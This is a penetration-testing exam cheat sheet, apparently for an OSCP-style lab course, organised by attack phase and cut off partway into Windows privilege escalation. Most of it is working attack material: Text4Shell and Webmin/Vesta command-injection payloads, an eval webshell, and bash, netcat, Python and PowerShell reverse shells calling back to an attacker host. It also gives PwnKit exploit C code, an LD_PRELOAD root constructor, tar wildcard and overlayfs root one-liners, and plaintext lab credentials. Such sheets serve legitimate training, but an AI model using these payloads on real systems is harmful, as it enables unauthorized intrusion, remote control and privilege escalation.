# Exam workflow

## How this sheet is organised

Thirteen chapters, in the order an attempt actually runs: exam workflow, recon, enumeration by service, web exploitation, foothold, Linux privesc, Windows privesc, Active Directory, pivoting, credentials, loot and cleanup — then one playbook per solved lab and a toolbox to finish. Every command came out of a solved lab in this repository or is the immediate next step from one; the playbooks show the exact chain that worked on each box.

`TARGET`, `LHOST` and `DC01` are placeholders. Substitute the real values and nothing else needs to change.

## The 24-hour clock

| Block | Hours | What "done" looks like |
| --- | --- | --- |
| Recon + enumeration | 0–2 | Every open port named, every service version recorded, every credential tried |
| Foothold | 2–6 | A shell, any shell, as any user |
| Privilege escalation | 6–10 | `root` / `SYSTEM`, `proof.txt` read |
| AD set | 10–18 | Domain user → DA, all three flags |
| Buffer | 18–24 | Re-attempt what failed, write the report |

Two rules that saved runs in these notes: never spend more than 20 minutes on a service without writing down why you are stuck, and never leave a box without a re-runnable command list for the report.

## Order of operations

```text
nmap -p- ─► versions ─► UDP ─► web/vhost ─► service-specific enum
   │                                              │
   └──────────────► credentials ◄─────────────────┘
                        │
              reused? known CVE? default? weak?
                        │
                    foothold ─► local enum ─► privesc ─► loot
                        │
                  (AD) domain enum ─► roast/spray ─► lateral ─► DA
```

## Note-taking that survives the exam

- One directory per target: `mkdir -p ~/exam/TARGET && cd ~/exam/TARGET`.
- Redirect every scan to a file with `-oN` / `-oA`; you will re-read it at hour 20.
- Keep a `creds.txt` with `user:password:source` and a `notes.md` with the *why*, not the output.
- Log the exact command that produced every flag; the report needs it verbatim.

# Reconnaissance

## Host discovery

- Ping sweep, then a quick port check on what answered.

```bash
sudo nmap -sn 192.168.133.0/24 -oG - 
sudo nmap -sn 10.10.133.0/24 -oG internal.txt
```

- No ICMP reply does not mean no host. Verify with a TCP port.

```bash
nxc smb 192.168.133.153
nxc winrm 192.168.133.153
```

## Full TCP sweep

- All 65535 ports first; versions only on what is open.

```bash
sudo nmap -Pn -p- --min-rate 3000 --max-retries 1 -T4 192.168.150.143 -oN nmap_full.txt
nmap -Pn -p- --min-rate 1000 -T4 --max-retries 2 -oN full_tcp.txt 192.168.137.151
nmap -p- -sV --min-rate 3000 -oN nmap_full.txt 192.168.161.156
```

- Then a targeted version scan on the ports that answered.

```bash
sudo nmap -Pn -sV -p21,22,80,81,443,3000,3001,3002,3003,3306,5432 192.168.150.143 -oN nmap_services.txt
nmap -Pn -sV -sC -p80,2855,2856,3389,5060,5066,5080,5986,7443,7680,8021,8081,8082 \
     --version-intensity 5 -oN services.txt 192.168.137.151
nmap -p21,22,80,20000 -T4 --min-rate 10000 --max-retries 2 -n -Pn -sC -sV -A 192.168.161.157
```

## Service fingerprinting tricks

- The TLS certificate often names the product before the banner does.

```bash
nmap -p21,25,110,143,465,587,993,995 --script ssl-cert 192.168.161.156
```

- NSE scripts that pay for themselves.

```bash
nmap -sC -sV -p 21 192.168.2.142
nmap -p80 --script=http-enum 192.168.50.20
nmap -p445 --script smb2-time 10.10.133.152
nmap -p 445 --script "smb-vuln-*" 192.168.133.153
```

- A version string is a claim; confirm the actual build.

```bash
grep -A3 "Port3003" nmap_services.txt | head -20
printf 'build\nversion\nnamespaces\n' | nc -w 4 192.168.150.143 3002
```

## UDP

- The port most scans miss, and the one that solved two labs here.

```bash
sudo nmap -sU -p 53,69,123,137,161,500,623 --script snmp-info,snmp-sysdescr 192.168.161.156
sudo nmap -sU -p 161 --reason 192.168.103.145
sudo nmap -sU 192.168.50.149
```

## Web surface

- Headers, title, and server before any fuzzing.

```bash
curl -sS -i --max-time 10 http://192.168.137.151/
curl -sI http://192.168.150.143/
curl -s http://192.168.150.143/ | grep -i "<title>"
curl -s http://192.168.150.143:81/ | grep -oiE "<title>[^<]*|nginx[^<]{0,20}" | head -3
```

- robots.txt, then the paths it hides.

```bash
curl -s http://192.168.161.156/robots.txt
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \
  http://192.168.161.156/phpmyadmin/ \
  http://192.168.161.156/webmail/ \
  http://192.168.161.156/roundcube/
```

- Do not trust a 200: the same page size is a redirect or an SPA catch-all.

```bash
for p in /upload/index.php /upload/ /api/index.php /api/ /manifest.json /; do
  printf '%-22s ' "$p"
  curl -sk -m 10 -o /dev/null \
    -w 'http=%{http_code} size=%{size_download}\n' "https://192.168.161.156:8083$p"
done
```

- Read the JavaScript bundle instead of fuzzing for API paths.

```bash
curl -sk https://192.168.161.156:8083/static/js/main.57f35a42.chunk.js -o main.js
grep -oE '(api|upload)/[a-zA-Z0-9_./?=-]*' main.js | sort -u | head -40
grep -oE 'v-[a-z0-9-]+' main.js | sort -u | head -40
```

## What "nothing found" means

- Port 80 with a default page is information: the application is elsewhere. Two labs here only fell for 20000/Usermin and 8083/Vesta.
- Check every port, not only the pretty ones: 1978, 3000, 8021, 9099, 20000, 35913, 49700.
- If a version looks old, map it to a CVE before brute-forcing anything.

```bash
searchsploit apache 2.4.49
searchsploit -p 49067
searchsploit -m linux/local/41154.sh
```

# Enumeration by service

## FTP (21)

- Anonymous first; it is free.

```bash
ftp -an TARGET
```

```console
ftp> ls -la
ftp> get file.txt
```

- Non-interactive pull of everything.

```bash
for f in BROCHURE CALENDAR FUNCTION NEWSLETTER REPORT; do
  wget -q "ftp://TARGET/backup/${f}-TEMPLATE.pdf"
done
```

- Credentials found elsewhere reuse here; test them in one loop.

```bash
python3 scripts/charlie_ftp_credtest_7f3a.py -H 192.168.161.157
```

- A read-only FTP is still valuable: `local.txt` is often world-readable.

```bash
curl -s -u 'stuart:BreakingBad92' ftp://192.168.161.144/local.txt
lftp -u cassie,cassie TARGET -e "get exec_test.txt -o /tmp/exec_test.txt; bye"
```

- If you need a scripted session, `ftplib` is more reliable than `ftp -n`.

```python
import ftplib
f = ftplib.FTP(); f.connect("TARGET", 21, timeout=15)
f.login("user", "password")
print(f.getwelcome(), f.pwd())
out = []
f.retrlines("LIST -la", out.append)
print("\n".join(out))
```

## PDF and document metadata

- Author, creator and company fields are people, and people are accounts.

```bash
exiftool -Author -Creator -CreatorTool -Producer -CreateDate -ModifyDate \
  -LastModifiedBy -Company -Title -Subject *.pdf
exiftool *.pdf | grep Author
```

## SSH (22)

- Password auth from a found credential; the right flags avoid key prompts.

```bash
sshpass -p 'BreakingBad92' ssh \
  -o PreferredAuthentications=password -o PubkeyAuthentication=no \
  stuart@192.168.161.144 'id; hostname'
```

- Key auth, explicitly ignoring the agent.

```bash
ssh -i ~/.ssh/charlie -o IdentitiesOnly=yes cassie@TARGET
```

- If the key is refused, read the server's reason, not the client's message.

```bash
grep -i cassie /var/log/auth.log | tail -n 5
grep -vE '^[[:space:]]*#' /etc/ssh/sshd_config | grep -vE '^[[:space:]]*$'
```

- A `DenyUsers` line is a hard block; it needs root to remove, so plan the order of the chain around it.

## SMTP and mail (25, 110, 143, 465, 587, 993, 995)

- User enumeration before any password attack.

```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

- Direct protocol conversation.

```bash
nc -nv 192.168.50.8 25
telnet 10.129.14.128 110
openssl s_client -connect 10.129.14.128:imaps
```

- Verify a credential against IMAP when the panel is the only other option.

```bash
curl -s --url 'imap://TARGET/' -u 'jack:3PUKsX98BMupBiCf' -v 2>&1 | grep -iE 'OK|NO|Login'
```

## DNS (53)

- Standard records, then the zone transfer nobody disabled.

```bash
dnsrecon -d megacorpone.com -t std
dnsenum megacorpone.com
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
dig ns megacorpone.com @192.168.50.251
```

## SMB (139, 445)

- Host identity, then shares, then permissions.

```bash
nxc smb 192.168.133.153
nxc smb 192.168.133.153 -u eric.wallows -p EricLikesRunning800 -d oscp.exam
nxc smb 10.10.152.142 -u web_svc -p 'Diamond1' --shares
```

- Null session listing and a real mount.

```bash
smbclient -N -L //TARGET
smbclient //TARGET/share -U 'domain%password' -c 'recurse ON; ls'
```

- Enumeration the old way, still useful for users and password policy.

```bash
enum4linux -a 172.31.135.192
sudo nbtscan -r 192.168.50.0/24
net accounts
```

- Vulnerability scripts are cheap; run them on every SMB host.

```bash
nmap -p 445 --script "smb-vuln-*" 192.168.133.153
```

## SNMP (161/udp)

- One community string can end the box. Two labs here did.

```bash
snmpget -v1 -c public -t 3 -r 1 -On TARGET 1.3.6.1.2.1.1.1.0
snmpwalk -v1 -c public TARGET 1.3.6.1.2.1.1
snmpwalk -v1 -c public -On TARGET 1.3.6.1.4.1.77.1.2.25
```

- The extend table is a root shell written down: it shows the exact command the daemon runs.

```bash
snmpwalk -v1 -c public TARGET 1.3.6.1.4.1.8072.1.3.2
snmpwalk -v2c -c public TARGET NET-SNMP-EXTEND-MIB::nsExtendObjects
```

- Process and software tables name the product to exploit.

```bash
snmpwalk -v1 -c public TARGET 1.3.6.1.2.1.25.4.2.1.2 | sed -E 's/.*STRING: //' | sort -u
snmpwalk -v1 -c public TARGET 1.3.6.1.2.1.25.6.3.1.2 | sed -E 's/.*STRING: //' | sort -u
```

- Community strings are worth a short list, not a wordlist.

```bash
onesixtyone -c community.txt TARGET
for c in kiero oscp oscp.exam student cl5 lab zachary public2 cisco; do
  printf "%-12s " "$c"
  snmpget -v1 -c "$c" -t 4 -r 0 TARGET 1.3.6.1.2.1.1.5.0
done
```

## LDAP (389, 636)

- Anonymous bind first; then a real account.

```bash
nxc ldap DC01 -u user -p pass --query "(sAMAccountName=tom_admin)" "lastLogonTimestamp,memberOf"
impacket-GetADUsers -all corp.com/user:pass -dc-ip DC01
```

## MSSQL (1433, 49700)

- The only question that matters on a SQL box.

```sql
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
```

- Connect, domain auth, with the instance port.

```bash
impacket-mssqlclient oscp.exam/SQL_SVC:'<cracked>'@10.10.133.154 -windows-auth -port 1433
impacket-mssqlclient oscp.exam/SQL_SVC:'<cracked>'@10.10.133.154 -windows-auth -port 49700
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

## WinRM (5985, 5986)

- Fast credential check, then a shell.

```bash
nxc winrm 192.168.133.153 -u eric.wallows -p EricLikesRunning800 -d oscp.exam
evil-winrm -i TARGET -u Administrator -H 3c4495bbd678fac8c9d218be4f2bbc7b
evil-winrm -i TARGET -u hacker -p 'P@ssw0rd123!' -S -P 5986
```

- A local account needs `--local-auth`; a domain account does not.

```bash
nxc winrm 192.168.133.153 -u Administrator -p December31 --local-auth
```

## RDP (3389)

- Confirm access before fighting with the client.

```bash
xfreerdp /v:TARGET /u:user /p:'password'
xfreerdp3 /v:TARGET /u:user /p:'password' +clipboard /dynamic-resolution
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
mstsc /v:client74
```

## NFS (111, 2049)

```bash
showmount -e TARGET
sudo mount -t nfs TARGET:/public-nfs /mnt/test -o nolock
sudo umount ./target-NFS
```

## Odd ports that paid off

- 3000 Aerospike, 8021 FreeSWITCH ESL, 20000 Usermin, 8083 Vesta, 81/8443 back-end vhosts.

```bash
printf 'build\nversion\nnamespaces\n' | nc -w 4 TARGET 3002
{ printf 'auth ClueCon\n\n'; sleep 2; printf 'api system whoami\n\n'; sleep 2; } | timeout 10 nc TARGET 8021
curl -sk https://TARGET:8083/ | grep -iE 'title|static/js'
```

## Git exposure

- A reachable `.git` directory is the whole source tree, including deleted commits.

```bash
git-dumper http://TARGET/.git ./loot
cd loot && git log --all --oneline
git show 44a055d
git show 80ad5fe:configuration/database.php
git ls-tree -r --name-only 80ad5fe
```

- When the interesting commit is gone, query every blob that ever existed.

```bash
git log --all -p -S'password' -- . | less
git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(rest)' |
  awk '$1=="blob"{print $3}' | sort -u
git log --format='%h %an <%ae>' | sort -u
```

- Check whether the exposure exists at all before dumping.

```bash
for u in config/config.yml composer.json .git/HEAD content/index.md CHANGELOG.md; do
  printf '%-20s ' "$u"
  curl -s -o /dev/null -w '%{http_code}\n' --max-time 8 "http://TARGET/index/$u"
done
```

# Web exploitation playbooks

## Content discovery

- Directory brute-force, sized to the box.

```bash
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -t 5
feroxbuster -u http://TARGET -s 200
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://TARGET/FUZZ
```

- Recursion and extensions in one pass.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://TARGET/FUZZ -recursion -recursion-depth 1 -e .php
```

- Vhosts: the subdomain is the application.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
  -u http://TARGET:PORT/ -H 'Host: FUZZ.target.htb' -fs 900
gobuster vhost -u http://target.htb -w subdomains.txt --append-domain
```

- POST bodies and JSON APIs.

```bash
ffuf -w words.txt -u http://TARGET/login -X POST \
  -d 'username=admin&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' \
  http://TARGET:5002/users/v1/login
```

## Default and reused credentials

- Try the three obvious pairs before anything clever: `admin:admin`, `user:user`, and the box's own hostname.
- A password found for one account is worth trying on every other service. In the git lab, one password opened SSH and FTP.
- Check the product's install defaults; the Vesta lab's panel was reachable with the system account, not a panel account.

## Text4Shell — Apache Commons Text (CVE-2022-42889)

- The trigger is any input that reaches `StringSubstitutor`; `${script:javascript:...}` is evaluated by Nashorn.

```bash
curl -s "http://TARGET/search?q=\${script:javascript:java.lang.Runtime.getRuntime().exec('id')}"
```

- Blind variant: prove execution with an outbound callback before asking for a shell.

```bash
python3 -m http.server 8888
curl -s "http://TARGET/search?q=\${script:javascript:java.lang.Runtime.getRuntime().exec('curl http://LHOST:8888/pwned')}"
```

- Then a reverse shell, base64-wrapped so quoting cannot break it.

```bash
PAYLOAD=$(echo -n 'bash -i >& /dev/tcp/LHOST/4444 0>&1' | base64 -w0)
curl -s "http://TARGET/search?q=\${script:javascript:java.lang.Runtime.getRuntime().exec('bash -c \"echo $PAYLOAD|base64 -d|bash\"')}"
nc -lvnp 4444
```

- The lab's own probe records the confirmation step: the parameter, the payload, and the callback in one file.

```bash
python3 tools/t4s_probe.py http://TARGET/
cat evidence/oob_callback.txt
```

## Usermin / Webmin 1.820 — GnuPG key name (EDB 50234)

- The `gnupg` module passes the key *name* into a shell pipeline; the payload is a name that closes the quote.

```text
NAME = ";id;echo "
gpg --fingerprint "";id;echo "" 2>/dev/null |
```

- Prove execution with a file, not a shell: stderr and network are unreliable.

```bash
python3 scripts/exploit_usermin_1820_7f3a.py -u TARGET -l cassie -p cassie \
  --lhost LHOST --lport 1337 \
  --payload 'id > /home/cassie/exec_test.txt 2>&1;'
lftp -u cassie,cassie TARGET -e "get exec_test.txt -o /tmp/exec_test.txt; bye"
```

- Then write an SSH key through the same RCE and log in properly.

```bash
KEY=$(base64 -w0 ~/.ssh/charlie.pub)
python3 scripts/exploit_usermin_1820_7f3a.py \
  -u TARGET -l cassie -p cassie \
  --lhost LHOST --lport 1337 \
  --payload "echo $KEY|base64 -d>/home/cassie/.ssh/authorized_keys;"
```

## Vesta Control Panel — second-order command injection

- The panel API is a sequence: get a CSRF token, log in, then call `v-*` commands as the panel user.

```bash
TOK=$(curl -sk https://TARGET:8083/api/v1/login/session.php | grep -oE '"token":"[a-f0-9]+"' | cut -d'"' -f4)
curl -sk -c cookies.txt -o /dev/null -w '%{http_code}\n' \
  -d "user=jack&password=3PUKsX98BMupBiCf&token=$TOK" \
  https://TARGET:8083/api/v1/login/index.php
```

- The injection is in the mailbox forwarding field, which the root-run `v-edit-mail-account` evaluates.

```text
';bash</home/jack/web/pwn.poc/public_html/iamroot/cmdtoexec>/home/jack/web/pwn.poc/public_html/iamroot/cmdresult;A='
```

- Webshell writes the command, root runs it, the webshell reads the result back.

```php
<?php
if (@$_GET["password"] != "<token>") exit();
eval($_GET["e"]);
```

```bash
curl -s "http://TARGET/ownwebshell.php?password=<token>&e=id" -H 'Host: pwn.poc'
```

## Mobile Mouse / "wifi mouse" server

- The mouse server speaks a trivial JSON-RPC over its own port; the `run` method executes without auth.

```bash
python3 tools/mouseserver_poc.py TARGET 1978 'cmd /c whoami'
```

- Confirm the product by the process list from SNMP if the port is filtered from your segment.

```bash
snmpwalk -v1 -c public TARGET 1.3.6.1.2.1.25.4.2.1.2 | sed -E 's/.*STRING: //' | sort -u
```

## Aerospike — UDF command execution (CVE-2020-13151)

- Unauthenticated `udf_put` plus `apply` is command execution as the Aerospike user.

```lua
function runCMD(rec, cmd)
    local handle = io.popen(cmd)
    local out = handle:read("*a")
    handle:close()
    return out
end
```

```bash
pip3 install --break-system-packages -q aerospike
python3 poc_aerospike_rce.py --ahost TARGET --cmd 'id; hostname; uname -r'
```

- The published exploit has a trap: the module must be attached to a real record and registered before `apply`.

```python
client.put(key, {"pk": "x"})
client.udf_put("/tmp/aero_poc/poc.lua")
client.apply(key, "poc", "runCMD", ["id"])
```

## FreeSWITCH Event Socket (8021)

- Default `ClueCon` password is an immediate `api` shell.

```bash
{ printf 'auth ClueCon\n\n'; sleep 2; printf 'api system whoami\n\n'; sleep 2; } | timeout 10 nc TARGET 8021
```

- Every call is stateless; `cd` does nothing unless it is in the same command.

```bash
python3 1.py TARGET "cmd /c cd /d C:\Windows\Temp & cd"
```

## JDWP (8000 or any debug port)

- A Java process listening on JDWP with `suspend=n` executes arbitrary classes as its own user — often root.
- The lab used the two small Java helpers to break in and resume.

```bash
java -cp . JdiBreakExec TARGET:8000 'id'
java -cp . JdiVmSuspend TARGET:8000
```

## Webshells

- Keep it minimal and authenticated; the point is a channel, not a UI.

```php
<?php
if (@$_GET["password"] != "<token>") exit();
eval($_GET["e"]);
```

```bash
curl -s "http://TARGET/shell.php?password=<token>&e=id"
```

## Finding a CVE worth using

```bash
searchsploit --id apache 2.4.49
searchsploit -w "Text4Shell"
searchsploit -m multiple/remote/50383.py
```

- Prefer the CVE that matches the *build*, not the banner: the aerospike notes show a patched version string with a vulnerable binary, and the reverse.

# Foothold and shells

## Listeners

```bash
nc -lvnp 4444
nc -lvnp 3000
rlwrap -cAr nc -lvnp 443
```

- Use a port the target can reach. Two labs here allowed only 53/80/443/3000 outbound.

```bash
nc -lvnp 3000
```

## Reverse shells

- Linux, bash.

```bash
bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
```

- Linux, when bash is filtered.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 1337 >/tmp/f
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("LHOST",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

- Windows, PowerShell.

```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TcpClient('LHOST',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
```

- Windows, `nc.exe` staged on disk.

```cmd
C:\Windows\Temp\nc.exe LHOST 443 -e cmd.exe
```

- A listener that survives the first command: `setsid` plus `nohup`.

```bash
setsid nohup python3 /tmp/.rs.py >/dev/null 2>&1 </dev/null &
```

## Shell upgrade

```bash
script -qc /bin/bash /dev/null
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```console
# attacker
CTRL+z
stty raw -echo
fg
stty -a

# target
export SHELL=bash
export TERM=xterm-256color
stty rows 38
stty columns 116
```

## File transfer in

- HTTP server on Kali is the default; pick a directory you control.

```bash
mkdir -p ~/www && cd ~/www && python3 -m http.server 8080
```

- Windows pull.

```bash
certutil -f -urlcache http://LHOST:8080/rev4446.ps1 C:\Users\chris\AppData\Local\Temp\rev4446.ps1
```

```powershell
iwr http://LHOST/Seatbelt.exe -OutFile .\Seatbelt.exe
curl.exe -o C:\Windows\Temp\PrintSpoofer64.exe http://LHOST:8888/PrintSpoofer64.exe
```

- Windows push (upload endpoint of choice).

```bash
curl.exe -T $report.zip http://LHOST:8888/upload
curl.exe http://LHOST:8080/upload -F files=@C:\Users\files.zip
```

- SMB as transport when HTTP is blocked.

```bash
impacket-smbserver share ./ -smb2support
copy \\LHOST\share\tool.exe C:\Windows\Temp\tool.exe
```

- Linux pull.

```bash
wget http://LHOST:8080/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh
curl -O http://LHOST:8080/libhax.so
```

- Linux push without a service, via nc.

```bash
nc -l -p 8000 > SharpKatz.exe
nc -q 0 LHOST 8000 < SharpKatz.exe
```

## Egress testing before you build a shell

- Test the port you plan to use, from the target, with a real TCP connect.

```bash
for p in 22 53 80 443 4444 8080 8834; do
  printf '%s: ' "$p"
  nc -zv -w3 LHOST "$p" 2>&1 | tail -1
done
timeout 5 bash -c 'echo SMOKE-3000 >/dev/tcp/LHOST/3000' 2>&1; echo rc=$?
```

- Windows equivalent.

```powershell
powershell -nop -c "(New-Object Net.Sockets.TcpClient).Connect('LHOST',4451);'ok'"
```

## Executing what you uploaded

- `nxc` can push and run in one line, which keeps the shell count down.

```bash
nxc smb TARGET -u Administrator -p December31 --local-auth \
  --put-file ./agent.exe '\Windows\Temp\agent.exe'
nxc winrm TARGET -u Administrator -p December31 --local-auth \
  -x 'cmd /c start /b C:\Windows\Temp\agent.exe -connect LHOST:443 -ignore-cert'
```

- Download a result the same way.

```bash
nxc smb TARGET -u Administrator -p December31 --local-auth \
  --get-file '\Windows\Temp\mimi.log' ./mimi.log
```
# Linux privilege escalation

## The five-minute triage

- These five commands decide which chapter you are in.

```bash
id; uname -a; sudo -l; getcap -r / 2>/dev/null; ls -la /etc/sudoers.d/
find / -perm -4000 -type f 2>/dev/null | wc -l
crontab -l; cat /etc/crontab | tail -8; ls -la /etc/cron.d /etc/cron.daily
```

- Distribution and patch level, because the kernel is often the finding.

```bash
cat /etc/issue; cat /etc/os-release; uname -r
dpkg -l | grep -E "^ii  policykit|^ii  screen"
cat /etc/iptables/rules.v4
route; routel
ss -anp
```

- Write down what is *not* exploitable too; the notes saved hours by refuting PwnKit and cron first.

```bash
dpkg -l | grep -E "^ii  policykit"
ls -ld /opt/aerospike /opt/aerospike/bin
ls -la /root/aerospike.sh
```

## SUID

- Find them, then ask which one is not stock.

```bash
find / -perm -4000 -type f 2>/dev/null
find /usr/bin /usr/sbin /bin /sbin /opt /home /usr/local -perm -4000 -type f 2>/dev/null | sort
```

- A `bash` copy with SUID is a root shell with `-p`.

```bash
/home/cassie/rootbash -p -i
/home/cassie/rootbash -p -c 'id'
```

- If the binary is not in GTFOBins, check whether it honours `PATH` or `--exec` style options.

```bash
strings /usr/local/bin/suid-binary | grep -iE 'sh|exec|system'
```

## Capabilities

```bash
getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
```

- `cap_setuid+ep` on any interpreter is root.

```bash
capsh --print
```

## Sudo

```bash
sudo -n -l
sudo -l
```

- A GTFOBins entry beats a custom exploit every time.

```bash
sudo /usr/bin/vim -c ':!/bin/sh'
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

- Sudo version CVEs (Baron Samedit) are worth checking only when the version is old.

```bash
sudo -V | head -2
```

## Cron

- Read every cron source, not only your own.

```bash
ls -lah /etc/cron*
cat /etc/crontab | grep -v '^#' | grep -v '^$'
cat /etc/cron.d/2minutes
systemctl list-timers --all
```

- Watch processes if the job is not visible from disk.

```bash
watch -n 1 "ps -aux | grep pass"
./pspy64s
```

- A writable script owned by root plus a cron entry is the whole privesc.

```bash
stat -c '%A %U:%G %n' /opt/admin; ls -A /opt/admin
```

## Tar wildcard injection

- `tar -zxf backup.tar.gz *` turns filenames into options; `--checkpoint-action` runs a command.

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh pwn.sh'
```

```bash
cat > pwn.sh <<'EOF'
#!/bin/sh
cp /bin/bash /home/cassie/rootbash
chmod 4755 /home/cassie/rootbash
EOF
chmod +x pwn.sh
```

- Reproduce it locally first; a failed attempt on the box costs a cron cycle.

```bash
BASE=/tmp/tartest; rm -rf "$BASE"; mkdir -p "$BASE/admin"; cd "$BASE/admin"
touch -- '--checkpoint=1' '--checkpoint-action=exec=sh pwn.sh'
tar -zxf "$BASE/backup.tar.gz" *
```

## PATH hijack

- A root-run script that calls a bare command inherits your `PATH`.

```bash
echo $PATH
export PATH=/tmp:$PATH
printf '#!/bin/sh\n/bin/sh -p\n' > /tmp/tar && chmod +x /tmp/tar
```

- Confirm the script runs as root before planting anything.

```bash
grep -R "system\|popen\|exec" /usr/local/bin/*.sh 2>/dev/null
```

## LD_PRELOAD and ld.so.preload

- If you can write `/etc/ld.so.preload`, every process loads your library — including root's.

```bash
printf '/tmp/screenroot/libhax.so\n' > /etc/ld.so.preload; echo rc=$?
cat -A /etc/ld.so.preload
```

- A constructor that only fires as root and only once.

```c
__attribute__ ((__constructor__))
void dropshell(void)
{
    if (geteuid() != 0) return;
    int fd = open("/tmp/screenroot/.lock", O_CREAT | O_EXCL | O_WRONLY, 0600);
    if (fd < 0) return;
    close(fd);
    unlink("/etc/ld.so.preload");
    setgid(0); setuid(0);
    system("/bin/sh /tmp/screenroot/rootcmd.sh > /tmp/screenroot/rootout.txt 2>&1");
    chmod("/tmp/screenroot/rootout.txt", 0666);
}
```

- Build it against the target's glibc, and check the symbol versions before shipping.

```bash
gcc -Os -fPIC -shared -fno-stack-protector -fno-asynchronous-unwind-tables -o libhax.so libhax.c
strip --strip-unneeded libhax.so
objdump -T libhax.so | grep -oE 'GLIBC_[0-9.]+' | sort -uV
```

- Trigger it with any setuid root binary, then read the result.

```bash
screen -ls >/dev/null 2>&1
cat /tmp/screenroot/rootout.txt
```

## Screen 4.5.0 — CVE-2017-5618

- The version string lies; check the binary's setuid bit and the package build.

```bash
ls -la /usr/bin/screen*
dpkg -l | grep -E '^ii  screen'
searchsploit -m linux/local/41154.sh
```

- The exploit writes `/etc/ld.so.preload` through a root-owned log file; the `-L` flag is the write primitive.

```bash
cd /etc && umask 000 && \
screen -D -m -L ld.so.preload /bin/sh -c 'printf "\n/tmp/screenroot/libhax.so\n"' >/dev/null 2>&1
```

- Watch for CRLF: a `\r` in the preload path makes every binary fail to start.

```bash
cat -A /etc/ld.so.preload
```

## PwnKit — CVE-2021-4034

- `pkexec` is setuid root on almost every desktop install; the bug is in argument handling.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv(void) {}
void gconv_init(void *step)
{
    setuid(0); setgid(0); setreuid(0,0); setregid(0,0);
    execl("/bin/sh", "sh", "-c",
          "/bin/cp /bin/bash /tmp/.rb161 && /bin/chmod 4755 /tmp/.rb161", NULL);
    _exit(0);
}
```

```bash
echo 'module UTF-8// PWNKIT// pwnkit 1' > gconv-modules
mkdir -p 'GCONV_PATH=.'
cp /usr/bin/true 'GCONV_PATH=./pwnkit.so:'
gcc --shared -fPIC -o pwnkit.so pwnkit.c
gcc -o cve-2021-4034 cve-2021-4034.c
```

- Run it from a directory you control, with a clean environment.

```bash
cd /tmp/pk161 && ./cve-2021-4034; echo "exit=$?"
GCONV_PATH=. CHARSET=PWNKIT /usr/bin/pkexec --help
```

## Kernel CVEs

- GameOver(lay) — CVE-2023-2640 / CVE-2023-32629 — Ubuntu overlayfs.

```bash
uname -a
id
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

- Dirty Pipe — CVE-2022-0847 — kernels 5.8 to 5.16.

```bash
uname -r
./dirtypipe /etc/passwd 1 oot:
```

- PwnKit is covered above; do not run two kernel exploits on the same box without cleaning up the first.

## Loot from groups you already have

- `adm` reads logs; logs contain passwords and usernames.

```bash
grep -aiE 'chloe' /var/log/auth.log /var/log/auth.log.1 | head
```

- `cdrom` and attached cloud-init ISOs carry first-boot credentials.

```bash
dd if=/dev/sr0 of=/tmp/cd.iso bs=1M
7z x -ocdext /tmp/cd.iso
grep -riE 'passw|chpasswd|ssh_authorized' cdext/openstack/latest/user_data
```

- Archives owned by you are still worth opening: config files hold database passwords.

```bash
7z l sitebackup3.zip | head -8
7z x sitebackup3.zip -oext
```

## Turning root into a stable session

- A key in `/root/.ssh` survives process crashes.

```bash
ssh-keygen -t ed25519 -N "" -f /tmp/exam_key -C exam-root
mkdir -p /root/.ssh
cp /tmp/exam_key.pub /root/.ssh/authorized_keys
chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys
ssh -i /tmp/exam_key root@TARGET
```

- Or a setuid copy of bash, which you must remove afterwards.

```bash
cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash
/tmp/rbash -p -c id
```

# Windows privilege escalation

## Triage

- Token first: it decides whether the Potato family applies.

```powershell
whoami /all
whoami /priv
whoami /groups
net user
net localgroup
net localgroup administrators
```

- Host, patch level, and what is installed.

```powershell
systeminfo
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
Get-Process
Get-Service
wmic product get name
```

- Automated passes, in order of signal.

```powershell
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
.\winPEAS.exe
```

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
.\SharpUp.exe audit
.\Seatbelt.exe -group=all -full
```

- File and history hunting pays more than most exploits.

```powershell
